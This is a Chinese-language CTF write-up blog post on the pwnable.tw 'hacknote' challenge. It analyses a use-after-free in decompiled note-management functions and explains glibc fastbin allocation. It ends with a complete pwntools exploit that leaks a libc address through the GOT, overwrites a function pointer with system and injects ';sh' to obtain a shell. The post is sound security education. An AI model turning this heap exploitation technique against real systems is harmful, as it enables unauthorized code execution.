<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="pwnable.tw_challenge_hacknote打开程序查看功能： 12345678910.&#x2F;hacknote----------------------       HackNote       ---------------------- 1. Add note           2. Delete note        3. Print note         4.">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnable.tw_hacknote">
<meta property="og:url" content="http://yoursite.com/2018/06/05/pwnable-tw-hacknote/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="pwnable.tw_challenge_hacknote打开程序查看功能： 12345678910.&#x2F;hacknote----------------------       HackNote       ---------------------- 1. Add note           2. Delete note        3. Print note         4.">
<meta property="article:published_time" content="2018-06-05T13:56:38.000Z">
<meta property="article:modified_time" content="2018-08-15T14:10:54.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>pwnable.tw_hacknote</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/06/06/pwnable-tw-Silver-Bullet/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/06/04/pwnable-tw-dublesort/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&text=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&is_video=false&description=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=pwnable.tw_hacknote&body=Check out this article: http://yoursite.com/2018/06/05/pwnable-tw-hacknote/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&name=pwnable.tw_hacknote&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-tw-challenge-hacknote"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw_challenge_hacknote</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-add-note"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 add_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-print-note"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 print_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-delete-note"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 delete_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-malloc分配机制"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 malloc分配机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-漏洞利用"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06-EXP"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 EXP</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        pwnable.tw_hacknote
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-06-05T13:56:38.000Z" itemprop="datePublished">2018-06-05</time>
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/PWN/">PWN</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="pwnable-tw-challenge-hacknote"><a href="#pwnable-tw-challenge-hacknote" class="headerlink" title="pwnable.tw_challenge_hacknote"></a>pwnable.tw_challenge_hacknote</h3><p>打开程序<br>查看功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote       </span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note          </span><br><span class="line"> 2. Delete note       </span><br><span class="line"> 3. Print note        </span><br><span class="line"> 4. Exit              </span><br><span class="line">----------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure>
<p>这里可以增加删除打印note信息<br>载入IDA分析:</p>
<h4 id="0x01-add-note"><a href="#0x01-add-note" class="headerlink" title="0x01 add_note"></a>0x01 add_note</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; &#x2F;&#x2F; ebx</span><br><span class="line">  signed int i; &#x2F;&#x2F; [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; &#x2F;&#x2F; [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  if ( dword_804A04C &lt;&#x3D; 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] &#x3D; malloc(8u);</span><br><span class="line">        if ( !ptr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)ptr[i] &#x3D; putnote;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size &#x3D; atoi(&amp;buf);</span><br><span class="line">        v0 &#x3D; ptr[i];</span><br><span class="line">        v0[1] &#x3D; malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)ptr[i] + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)ptr[i] + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++dword_804A04C;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里malloc了一个结构体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct note&#123;</span><br><span class="line">*putnote;   &#x2F;&#x2F;指向用于输出note内容的函数( *(_DWORD *)ptr[i] &#x3D; putnote;)</span><br><span class="line">*text;   &#x2F;&#x2F;指向note对应的内容(read(0, *((void **)ptr[i] + 1), size);)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而后根据size再申请新的空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0 &#x3D; ptr[i];</span><br><span class="line">v0[1] &#x3D; malloc(size);&#x2F;&#x2F;申请存储note内容的地址</span><br></pre></td></tr></table></figure>
<h4 id="0x02-print-note"><a href="#0x02-print-note" class="headerlink" title="0x02 print_note"></a>0x02 print_note</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;&#x3D; dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[v1] )</span><br><span class="line">    (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里调用结构体第一个位置的地址所指的函数<br>参数就是结构体本身</p>
<h4 id="0x03-delete-note"><a href="#0x03-delete-note" class="headerlink" title="0x03 delete_note"></a>0x03 delete_note</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int delete_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;&#x3D; dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)ptr[v1] + 1));</span><br><span class="line">    free(ptr[v1]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里只是用free释放<br>但没有将指针置空为NULL<br>产生一个迷途指针<br>这里便可利用这个指针来造成堆溢出来获得shell</p>
<h4 id="0x04-malloc分配机制"><a href="#0x04-malloc分配机制" class="headerlink" title="0x04 malloc分配机制"></a>0x04 malloc分配机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>
<p>SIZE_SZ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sizeof(size_t)   &#x2F;&#x2F;32位-&gt;4字节，64位-&gt;8字节</span><br></pre></td></tr></table></figure>
<p>MINSIZE:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define MINSIZE  \</span><br><span class="line">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure>
<p>MIN_CHUNK_SIZE为一个chunk结构体的大小：为16字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  &#x2F;* Size of previous chunk (if free).  *&#x2F;</span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       &#x2F;* Size in bytes, including overhead. *&#x2F;</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         &#x2F;* double links -- used only if free. *&#x2F;</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Only used for large blocks: pointer to next larger size.  *&#x2F;</span><br><span class="line">  struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F;</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>MALLOC_ALIGNMENT为2*SIZE_SZ</strong><br><strong>MALLOC_ALIGN_MASK 为2*SIZE_SZ-1</strong><br><strong>由此即可通过最开始的request2size(req) 计算出系统分配出的内存大小</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">例如，32位时：</span><br><span class="line">MINSIZE：(16+2*4-1)&amp;~(2*4-1)&#x3D;16</span><br><span class="line">申请字节：</span><br><span class="line">1-4字节：(req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE</span><br><span class="line">系统分配：</span><br><span class="line">MINSIZE&#x3D;16字节</span><br><span class="line">申请字节：</span><br><span class="line">5-12字节：(req) + SIZE_SZ + MALLOC_ALIGN_MASK &gt;&#x3D;MINSIZE</span><br><span class="line">系统分配：</span><br><span class="line">(req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp;~MALLOC_ALIGN_MASK&#x3D;16字节</span><br><span class="line">申请字节：</span><br><span class="line">13字节</span><br><span class="line">系统分配：</span><br><span class="line">(req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp;~MALLOC_ALIGN_MASK&#x3D;24字节</span><br><span class="line">&#x2F;&#x2F;可以看到分配相邻上下大小之差为系统指针大小（32位8字节，64位16字节）</span><br></pre></td></tr></table></figure>
<p><strong>又因fastbin采用LIFO原则(其会在空表从后往前寻找首先合适的堆块)</strong><br>故而我们需要先申请两个note<br>再利用delete制造迷途指针并利用堆溢出覆盖堆中数据从而拿到shell</p>
<h4 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h4><p>首先看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</span><br></pre></td></tr></table></figure>
<p>当我们print_note时，会调用结构体中第一个地址指向的函数<br>函数参数就是结构体自身<br>我们需要溢出覆盖掉一个之前申请过的结构体<br>将结构体第一个函数地址修改（获得shell，需要覆盖为system的地址）<br>而一个结构体16个字节，system的参数即为结构体本身<br>这里需要使用system的参数截断<br>例如使用:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;||sh&quot;或者&quot;;sh&quot;</span><br></pre></td></tr></table></figure>
<p>这里可以利用malloc的分配机制<br>首先申请两个note，长度&gt;12(例，申请16字节)<br>这时候堆内：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16-&gt;24-&gt;16-&gt;24</span><br></pre></td></tr></table></figure>
<p>而后使用delete_note来free这4个空间<br>当我们再次add_note一个16字节的note时<br>根据fastbin的LIFO原则<br>从后往前第一个满足的空间便是第一个空间（第三个空间处覆盖为结构体）<br>即：note的文本内容会修改原本0号结构体<br><strong>如果我们修改结构体中*text内容为.got.plt中的一个地址</strong><br><strong>那么print_note第0号即会打印出函数加载后的真实地址</strong><br>再根据其在libc库中的偏移求出程序加载动态库的基址<br>进而计算出system函数地址<br>再继续修改一次结构体数据为system的地址（参数截断上面已说明）<br>重新print_note来调用修改后结构体中地址对应的system函数<br>进而获取shell</p>
<h4 id="0x06-EXP"><a href="#0x06-EXP" class="headerlink" title="0x06 EXP"></a>0x06 EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add_note(size,content):</span><br><span class="line">	  p.recvuntil(&quot;choice :&quot;)</span><br><span class="line">	  p.sendline(&quot;1&quot;)</span><br><span class="line">	  p.recvuntil(&quot;size :&quot;)</span><br><span class="line">	  p.sendline(size)</span><br><span class="line">	  p.recvuntil(&quot;Content :&quot;)</span><br><span class="line">	  p.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete_note(index):</span><br><span class="line">	  p.recvuntil(&quot;choice :&quot;)</span><br><span class="line">	  p.sendline(&quot;2&quot;)</span><br><span class="line">	  p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">	  p.sendline(index)</span><br><span class="line"></span><br><span class="line">def print_note(index):</span><br><span class="line">	  p.recvuntil(&quot;choice :&quot;)</span><br><span class="line">	  p.sendline(&quot;3&quot;)</span><br><span class="line">	  p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">	  p.sendline(index)</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&quot;chall.pwnable.tw&quot;, 10102)</span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;hacknote&quot;)</span><br><span class="line">elib&#x3D;ELF(&quot;.&#x2F;libc_32.so.6&quot;)</span><br><span class="line">read_got&#x3D;elf.got[&quot;read&quot;]</span><br><span class="line">putnote&#x3D;0x804862b</span><br><span class="line">add_note(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">add_note(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">delete_note(&#39;0&#39;)</span><br><span class="line">delete_note(&#39;1&#39;)</span><br><span class="line">add_note(&#39;8&#39;,p32(putnote)+p32(read_got))</span><br><span class="line">print_note(&#39;0&#39;)</span><br><span class="line">read_addr&#x3D;u32(p.recv()[:4])</span><br><span class="line">sys_addr&#x3D;read_addr-elib.symbols[&quot;read&quot;]+elib.symbols[&quot;system&quot;]</span><br><span class="line">delete_note(&#39;2&#39;)</span><br><span class="line">add_note(&#39;8&#39;,p32(sys_addr)+&quot;;sh\x00&quot;)</span><br><span class="line">print_note(&#39;0&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-tw-challenge-hacknote"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw_challenge_hacknote</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-add-note"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 add_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-print-note"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 print_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-delete-note"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 delete_note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-malloc分配机制"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 malloc分配机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-漏洞利用"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06-EXP"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 EXP</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&text=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&is_video=false&description=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=pwnable.tw_hacknote&body=Check out this article: http://yoursite.com/2018/06/05/pwnable-tw-hacknote/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
